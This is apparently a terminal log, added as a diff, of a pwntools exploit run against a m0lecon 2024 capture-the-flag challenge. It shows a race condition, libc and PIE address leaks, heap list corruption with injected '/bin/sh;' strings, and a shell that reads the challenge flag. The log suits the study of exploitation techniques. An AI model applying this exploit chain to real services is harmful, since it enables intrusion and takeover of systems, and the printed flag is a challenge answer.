@@ -1,0 +1,272 @@
+root@user-virtual-machine:/home/user/Desktop/molecon_2024# python3 exp.py 
+[*] '/home/user/Desktop/molecon_2024/libc.so.6'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+[*] '/home/user/Desktop/molecon_2024/chal_patched'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+    RUNPATH:  b'.'
+[*] Loaded 5 cached gadgets for './chal_patched'
+[+] Opening connection to ducts.challs.m0lecon.it on port 4444: Done
+44781
+PORT = 44781
+[+] Opening connection to ducts.challs.m0lecon.it on port 44781: Done
+[+] Opening connection to ducts.challs.m0lecon.it on port 44781: Done
+[+] Opening connection to ducts.challs.m0lecon.it on port 44781: Done
+[+] Opening connection to ducts.challs.m0lecon.it on port 44781: Done
+[+] Opening connection to ducts.challs.m0lecon.it on port 44781: Done
+[+] Opening connection to ducts.challs.m0lecon.it on port 44781: Done
+[+] Opening connection to ducts.challs.m0lecon.it on port 44781: Done
+[+] Opening connection to ducts.challs.m0lecon.it on port 44781: Done
+[+] Opening connection to ducts.challs.m0lecon.it on port 44781: Done
+[+] Opening connection to ducts.challs.m0lecon.it on port 44781: Done
+[+] Opening connection to ducts.challs.m0lecon.it on port 44781: Done
+[+] Opening connection to ducts.challs.m0lecon.it on port 44781: Done
+[+] Opening connection to ducts.challs.m0lecon.it on port 44781: Done
+[+] Opening connection to ducts.challs.m0lecon.it on port 44781: Done
+[+] Opening connection to ducts.challs.m0lecon.it on port 44781: Done
+[+] Opening connection to ducts.challs.m0lecon.it on port 44781: Done
+[+] Opening connection to ducts.challs.m0lecon.it on port 44781: Done
+[+] Opening connection to ducts.challs.m0lecon.it on port 44781: Done
+[+] Opening connection to ducts.challs.m0lecon.it on port 44781: Done
+[+] Opening connection to ducts.challs.m0lecon.it on port 44781: Done
+[+] Opening connection to ducts.challs.m0lecon.it on port 44781: Done
+[+] Opening connection to ducts.challs.m0lecon.it on port 44781: Done
+[+] Opening connection to ducts.challs.m0lecon.it on port 44781: Done
+[+] Opening connection to ducts.challs.m0lecon.it on port 44781: Done
+[+] Opening connection to ducts.challs.m0lecon.it on port 44781: Done
+[+] Opening connection to ducts.challs.m0lecon.it on port 44781: Done
+[+] Opening connection to ducts.challs.m0lecon.it on port 44781: Done
+[+] Opening connection to ducts.challs.m0lecon.it on port 44781: Done
+[+] Opening connection to ducts.challs.m0lecon.it on port 44781: Done
+[+] Opening connection to ducts.challs.m0lecon.it on port 44781: Done
+[+] Opening connection to ducts.challs.m0lecon.it on port 44781: Done
+[+] Opening connection to ducts.challs.m0lecon.it on port 44781: Done
+[+] Opening connection to ducts.challs.m0lecon.it on port 44781: Done
+[+] Opening connection to ducts.challs.m0lecon.it on port 44781: Done
+[+] Opening connection to ducts.challs.m0lecon.it on port 44781: Done
+[+] Opening connection to ducts.challs.m0lecon.it on port 44781: Done
+[+] Opening connection to ducts.challs.m0lecon.it on port 44781: Done
+[+] Opening connection to ducts.challs.m0lecon.it on port 44781: Done
+[+] Opening connection to ducts.challs.m0lecon.it on port 44781: Done
+[+] Opening connection to ducts.challs.m0lecon.it on port 44781: Done
+[+] Opening connection to ducts.challs.m0lecon.it on port 44781: Done
+/usr/local/lib/python3.10/dist-packages/pwnlib/tubes/tube.py:823: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
+  res = self.recvuntil(delim, timeout=timeout)
+[*] Closed connection to ducts.challs.m0lecon.it port 44781
+[*] Closed connection to ducts.challs.m0lecon.it port 44781
+[*] Closed connection to ducts.challs.m0lecon.it port 44781
+[*] Closed connection to ducts.challs.m0lecon.it port 44781
+[*] Closed connection to ducts.challs.m0lecon.it port 44781
+[*] Closed connection to ducts.challs.m0lecon.it port 44781
+[*] Closed connection to ducts.challs.m0lecon.it port 44781
+[*] Closed connection to ducts.challs.m0lecon.it port 44781
+[*] Closed connection to ducts.challs.m0lecon.it port 44781
+[*] Closed connection to ducts.challs.m0lecon.it port 44781
+[*] Closed connection to ducts.challs.m0lecon.it port 44781
+[*] Closed connection to ducts.challs.m0lecon.it port 44781
+[*] Closed connection to ducts.challs.m0lecon.it port 44781
+[*] Closed connection to ducts.challs.m0lecon.it port 44781
+[*] Closed connection to ducts.challs.m0lecon.it port 44781
+[*] Closed connection to ducts.challs.m0lecon.it port 44781
+[*] Closed connection to ducts.challs.m0lecon.it port 44781
+[*] Closed connection to ducts.challs.m0lecon.it port 44781
+[*] Closed connection to ducts.challs.m0lecon.it port 44781
+[*] Closed connection to ducts.challs.m0lecon.it port 44781
+[*] Closed connection to ducts.challs.m0lecon.it port 44781
+[*] Closed connection to ducts.challs.m0lecon.it port 44781
+[*] Closed connection to ducts.challs.m0lecon.it port 44781
+[*] Closed connection to ducts.challs.m0lecon.it port 44781
+[*] Closed connection to ducts.challs.m0lecon.it port 44781
+[*] Closed connection to ducts.challs.m0lecon.it port 44781
+[*] Closed connection to ducts.challs.m0lecon.it port 44781
+[*] Closed connection to ducts.challs.m0lecon.it port 44781
+[*] Closed connection to ducts.challs.m0lecon.it port 44781
+[*] Closed connection to ducts.challs.m0lecon.it port 44781
+[*] Closed connection to ducts.challs.m0lecon.it port 44781
+[*] Closed connection to ducts.challs.m0lecon.it port 44781
+[*] Closed connection to ducts.challs.m0lecon.it port 44781
+[*] Closed connection to ducts.challs.m0lecon.it port 44781
+[*] Closed connection to ducts.challs.m0lecon.it port 44781
+[*] Closed connection to ducts.challs.m0lecon.it port 44781
+[*] Closed connection to ducts.challs.m0lecon.it port 44781
+[*] Closed connection to ducts.challs.m0lecon.it port 44781
+[*] Closed connection to ducts.challs.m0lecon.it port 44781
+[*] Closed connection to ducts.challs.m0lecon.it port 44781
+b"7fa73d770010 is '' by BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB. Next is 0x557797d4e8a0\nMessage 0x557797d4e8a0 is '\x01' by CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC. Next is 0x557797d53900\nMessage 0x557797d53900 is '\x01' by CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC. Next is 0x557797d58960\nMessage 0x557797d58960 is '\x01' by CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC. Next is 0x557796c9d120\nDestroying message"
+[+] Race success
+[+] libc_leak: 0x7fa73d770010
+[+] libc_base: 0x7fa73d795000
+[+] pie_leak: 0x557796c9d120
+target_write: 0x557796c9d0b0!
+Attach debugger!
+[+] Opening connection to ducts.challs.m0lecon.it on port 44781: Done
+[+] Opening connection to ducts.challs.m0lecon.it on port 44781: Done
+[+] Opening connection to ducts.challs.m0lecon.it on port 44781: Done
+[+] Opening connection to ducts.challs.m0lecon.it on port 44781: Done
+[+] Opening connection to ducts.challs.m0lecon.it on port 44781: Done
+[+] Opening connection to ducts.challs.m0lecon.it on port 44781: Done
+[+] Opening connection to ducts.challs.m0lecon.it on port 44781: Done
+[+] Opening connection to ducts.challs.m0lecon.it on port 44781: Done
+[+] Opening connection to ducts.challs.m0lecon.it on port 44781: Done
+[+] Opening connection to ducts.challs.m0lecon.it on port 44781: Done
+[+] Opening connection to ducts.challs.m0lecon.it on port 44781: Done
+[+] Opening connection to ducts.challs.m0lecon.it on port 44781: Done
+[+] Opening connection to ducts.challs.m0lecon.it on port 44781: Done
+[+] Opening connection to ducts.challs.m0lecon.it on port 44781: Done
+[+] Opening connection to ducts.challs.m0lecon.it on port 44781: Done
+[+] Opening connection to ducts.challs.m0lecon.it on port 44781: Done
+[+] Opening connection to ducts.challs.m0lecon.it on port 44781: Done
+[+] Opening connection to ducts.challs.m0lecon.it on port 44781: Done
+[+] Opening connection to ducts.challs.m0lecon.it on port 44781: Done
+[+] Opening connection to ducts.challs.m0lecon.it on port 44781: Done
+[+] Opening connection to ducts.challs.m0lecon.it on port 44781: Done
+[+] Opening connection to ducts.challs.m0lecon.it on port 44781: Done
+[+] Opening connection to ducts.challs.m0lecon.it on port 44781: Done
+[+] Opening connection to ducts.challs.m0lecon.it on port 44781: Done
+[+] Opening connection to ducts.challs.m0lecon.it on port 44781: Done
+[+] Opening connection to ducts.challs.m0lecon.it on port 44781: Done
+[+] Opening connection to ducts.challs.m0lecon.it on port 44781: Done
+[+] Opening connection to ducts.challs.m0lecon.it on port 44781: Done
+[+] Opening connection to ducts.challs.m0lecon.it on port 44781: Done
+[+] Opening connection to ducts.challs.m0lecon.it on port 44781: Done
+[+] Opening connection to ducts.challs.m0lecon.it on port 44781: Done
+[+] Opening connection to ducts.challs.m0lecon.it on port 44781: Done
+[+] Opening connection to ducts.challs.m0lecon.it on port 44781: Done
+[+] Opening connection to ducts.challs.m0lecon.it on port 44781: Done
+[+] Opening connection to ducts.challs.m0lecon.it on port 44781: Done
+[+] Opening connection to ducts.challs.m0lecon.it on port 44781: Done
+[+] Opening connection to ducts.challs.m0lecon.it on port 44781: Done
+[+] Opening connection to ducts.challs.m0lecon.it on port 44781: Done
+[+] Opening connection to ducts.challs.m0lecon.it on port 44781: Done
+[+] Opening connection to ducts.challs.m0lecon.it on port 44781: Done
+/home/user/Desktop/molecon_2024/exp.py:184: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
+  payload = flat(
+[*] Closed connection to ducts.challs.m0lecon.it port 44781
+[*] Closed connection to ducts.challs.m0lecon.it port 44781
+[*] Closed connection to ducts.challs.m0lecon.it port 44781
+[*] Closed connection to ducts.challs.m0lecon.it port 44781
+[*] Closed connection to ducts.challs.m0lecon.it port 44781
+[*] Closed connection to ducts.challs.m0lecon.it port 44781
+[*] Closed connection to ducts.challs.m0lecon.it port 44781
+[*] Closed connection to ducts.challs.m0lecon.it port 44781
+[*] Closed connection to ducts.challs.m0lecon.it port 44781
+[*] Closed connection to ducts.challs.m0lecon.it port 44781
+[*] Closed connection to ducts.challs.m0lecon.it port 44781
+[*] Closed connection to ducts.challs.m0lecon.it port 44781
+[*] Closed connection to ducts.challs.m0lecon.it port 44781
+[*] Closed connection to ducts.challs.m0lecon.it port 44781
+[*] Closed connection to ducts.challs.m0lecon.it port 44781
+[*] Closed connection to ducts.challs.m0lecon.it port 44781
+[*] Closed connection to ducts.challs.m0lecon.it port 44781
+[*] Closed connection to ducts.challs.m0lecon.it port 44781
+[*] Closed connection to ducts.challs.m0lecon.it port 44781
+[*] Closed connection to ducts.challs.m0lecon.it port 44781
+[*] Closed connection to ducts.challs.m0lecon.it port 44781
+[*] Closed connection to ducts.challs.m0lecon.it port 44781
+[*] Closed connection to ducts.challs.m0lecon.it port 44781
+[*] Closed connection to ducts.challs.m0lecon.it port 44781
+[*] Closed connection to ducts.challs.m0lecon.it port 44781
+[*] Closed connection to ducts.challs.m0lecon.it port 44781
+[*] Closed connection to ducts.challs.m0lecon.it port 44781
+[*] Closed connection to ducts.challs.m0lecon.it port 44781
+[*] Closed connection to ducts.challs.m0lecon.it port 44781
+[*] Closed connection to ducts.challs.m0lecon.it port 44781
+[*] Closed connection to ducts.challs.m0lecon.it port 44781
+[*] Closed connection to ducts.challs.m0lecon.it port 44781
+[*] Closed connection to ducts.challs.m0lecon.it port 44781
+[*] Closed connection to ducts.challs.m0lecon.it port 44781
+[*] Closed connection to ducts.challs.m0lecon.it port 44781
+[*] Closed connection to ducts.challs.m0lecon.it port 44781
+[*] Closed connection to ducts.challs.m0lecon.it port 44781
+[*] Closed connection to ducts.challs.m0lecon.it port 44781
+[*] Closed connection to ducts.challs.m0lecon.it port 44781
+[*] Closed connection to ducts.challs.m0lecon.it port 44781
+[+] Opening connection to ducts.challs.m0lecon.it on port 44781: Done
+[*] Closed connection to ducts.challs.m0lecon.it port 44781
+[+] Opening connection to ducts.challs.m0lecon.it on port 44781: Done
+[*] Closed connection to ducts.challs.m0lecon.it port 44781
+[+] Opening connection to ducts.challs.m0lecon.it on port 44781: Done
+[*] Closed connection to ducts.challs.m0lecon.it port 44781
+[+] Opening connection to ducts.challs.m0lecon.it on port 44781: Done
+[*] Closed connection to ducts.challs.m0lecon.it port 44781
+[+] Opening connection to ducts.challs.m0lecon.it on port 44781: Done
+[*] Closed connection to ducts.challs.m0lecon.it port 44781
+[*] Switching to interactive mode
+ with len '20480' by CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC
+Destroying message with len '20480' by CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC
+Destroying message with len '20480' by CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC
+Message 0x7fa73d770010 is '' by BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB. Next is 0x557797d4e8a0
+Message 0x557797d4e8a0 is '' by CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC. Next is 0x557797d53900
+Message 0x557797d53900 is '' by CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC. Next is 0x557797d58960
+Message 0x557797d58960 is '' by CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC. Next is 0x557797d5d9e0
+Message 0x557797d5d9e0 is '' by CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC. Next is 0x557797d62a40
+Message 0x557797d62a40 is '' by CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC. Next is 0x557797d67aa0
+Message 0x557797d67aa0 is '' by CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC. Next is 0x557796c9d120
+Destroying message with len '20480' by CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC
+Destroying message with len '20480' by CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC
+Message 0x7fa73d770010 is '' by BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB. Next is 0x557797d4e8a0
+Message 0x557797d4e8a0 is '' by CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC. Next is 0x557797d53900
+Message 0x557797d53900 is '' by CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC. Next is 0x557797d58960
+Message 0x557797d58960 is '' by CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC. Next is 0x557797d5d9e0
+Message 0x557797d5d9e0 is '' by CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC. Next is 0x557797d62a40
+Message 0x557797d62a40 is '' by CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC. Next is 0x557797d67aa0
+Message 0x557797d67aa0 is '' by CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC. Next is 0x557797d6cb00
+Message 0x557797d6cb00 is '' by CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC. Next is 0x557797d71b60
+Message 0x557797d71b60 is '' by CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC. Next is 0x557796c9d120
+Destroying message with len '20480' by CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC
+Destroying message with len '20480' by CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC
+Message 0x7fa73d770010 is '' by BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB. Next is 0x557797d4e8a0
+Message 0x557797d4e8a0 is '' by CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC. Next is 0x557797d53900
+Message 0x557797d53900 is '' by CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC. Next is 0x557797d58960
+Message 0x557797d58960 is '' by CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC. Next is 0x557797d5d9e0
+Message 0x557797d5d9e0 is '' by CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC. Next is 0x557797d62a40
+Message 0x557797d62a40 is '' by CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC. Next is 0x557797d67aa0
+Message 0x557797d67aa0 is '' by CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC. Next is 0x557797d6cb00
+Message 0x557797d6cb00 is '' by CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC. Next is 0x557797d71b60
+Message 0x557797d71b60 is '' by CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC. Next is 0x557797d76bc0
+Message 0x557797d76bc0 is '' by CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC. Next is 0x557797d7bc20
+Message 0x557797d7bc20 is '' by CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC. Next is 0x557796c9d120
+Destroying message with len '20480' by CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC
+Destroying message with len '20480' by CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC
+Destroying message with len '20480' by CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC
+Message 0x7fa73d770010 is '' by BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB. Next is 0x557797d4e8a0
+Message 0x557797d4e8a0 is '' by CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC. Next is 0x557797d53900
+Message 0x557797d53900 is '' by CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC. Next is 0x557797d58960
+Message 0x557797d58960 is '' by CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC. Next is 0x557797d5d9e0
+Message 0x557797d5d9e0 is '' by CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC. Next is 0x557797d62a40
+Message 0x557797d62a40 is '' by CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC. Next is 0x557797d67aa0
+Message 0x557797d67aa0 is '' by CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC. Next is 0x557797d6cb00
+Message 0x557797d6cb00 is '' by CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC. Next is 0x557797d71b60
+Message 0x557797d71b60 is '' by CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC. Next is 0x557797d6cb00
+Message 0x557797d6cb00 is '' by CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC. Next is 0x557797d71b60
+Message 0x557797d71b60 is '' by CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC. Next is 0x557797d76bc0
+Message 0x557797d76bc0 is '' by CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC. Next is 0x557797d7bc20
+Message 0x557797d7bc20 is '' by CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC. Next is 0x557797d80c80
+Message 0x557797d80c80 is '' by CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC. Next is 0x557797d85ce0
+Message 0x557797d85ce0 is '' by CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC. Next is 0x557797d8ad40
+Message 0x557797d8ad40 is '' by CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC. Next is 0x557797d8fda0
+Message 0x557797d8fda0 is '' by CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC. Next is 0x557797d94e00
+Message 0x557797d94e00 is '' by CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC. Next is 0x557797d99e60
+Message 0x557797d99e60 is '' by CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC. Next is 0x557797d9eec0
+Message 0x557797d9eec0 is '' by CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC. Next is 0x557796c9d120
+Destroying message with len '20480' by CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC
+Destroying message with len '20480' by CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC
+Destroying message with len '20480' by CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC
+Destroying message with len '20480' by /bin/sh;/bin/sh;/bin/sh;/bin/sh;/bin/sh;
+Destroying message with len '20480' by /bin/sh;/bin/sh;/bin/sh;/bin/sh;/bin/sh;
+Destroying message with len '20480' by /bin/sh;/bin/sh;/bin/sh;/bin/sh;/bin/sh;
+Invalid command 1Destroying message with len '0' by /bin/sh;/bin/sh;/bin/sh;/bin/sh;/bin/sh;/bin/sh;/bin/sh;/bin/sh;
+Destroying message with len '0' by /bin/sh;/bin/sh;/bin/sh;/bin/sh;/bin/sh;/bin/sh;/bin/sh;/bin/sh;
+Destroying message with len '327680' by p]~=\xa7\x7f
+/bin/sh: 0: can't access tty; job control turned off
+$ $ ls
+chal  flag.txt
+$ $ cat flag.txt
+ptm{7h053_p1p35_4r3_m3553d_up_l1k3_4_5up3r_m4r10_64m3}$ $ int(libc_leak,0x10)int(libc_leak,0x10) 
